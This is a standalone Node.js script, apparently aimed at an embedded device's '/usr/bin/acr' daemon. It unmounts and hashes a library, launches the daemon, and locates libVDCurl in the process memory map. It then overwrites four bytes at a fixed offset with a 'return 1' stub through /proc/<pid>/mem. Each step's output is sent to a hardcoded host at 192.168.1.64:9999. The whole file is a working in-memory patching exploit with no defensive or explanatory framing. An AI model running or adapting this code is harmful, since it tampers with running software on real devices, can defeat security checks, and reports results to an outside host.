"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 1500); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.umount = sh("umount /usr/lib/libVDCurl.so.0.9 2>&1; md5sum /usr/lib/libVDCurl.so.0.9");

try {
    var c = cp.spawn("/usr/bin/acr", [], { detached: true, stdio: "ignore" });
    c.unref();
    out.spawn = "pid=" + c.pid;
} catch (e) { out.spawn = "ERR " + e.message; }
post("/acr_mem_patch", out);

setTimeout(function () {
    var o = {};
    try {
        var ps = cp.execSync("ps -ef | grep '/usr/bin/acr' | grep -v grep | head -1", { encoding: "utf8" });
        o.ps_line = ps.trim();
        var pid = ps.trim().split(/[ \t]+/)[1];
        var maps = fs.readFileSync("/proc/" + pid + "/maps", "utf8");
        o.maps_vdc = maps.split("\n").filter(function (L) { return L.indexOf("libVDCurl") >= 0; }).join(" | ");
        var target = null;
        maps.split("\n").forEach(function (L) {
            var m = L.match(/^([0-9a-f]+)-[0-9a-f]+ r-xp 00000000 .*libVDCurl/);
            if (m) target = parseInt(m[1], 16) + 0xbc24;
        });
        o.patch_addr = target ? "0x" + target.toString(16) : "NOT FOUND";
        if (target) {
            var mem = fs.openSync("/proc/" + pid + "/mem", "r+");
            var b = new Buffer(4);
            fs.readSync(mem, b, 0, 4, target);
            o.before = b.toString("hex");
            var stub = new Buffer([0x01, 0x20, 0x70, 0x47]);
            fs.writeSync(mem, stub, 0, 4, target);
            fs.readSync(mem, b, 0, 4, target);
            o.after = b.toString("hex");
            fs.closeSync(mem);
        }
    } catch (e) { o.err = "" + (e.stack || e.message); }
    post("/acr_mem_patch2", o);
}, 5000);
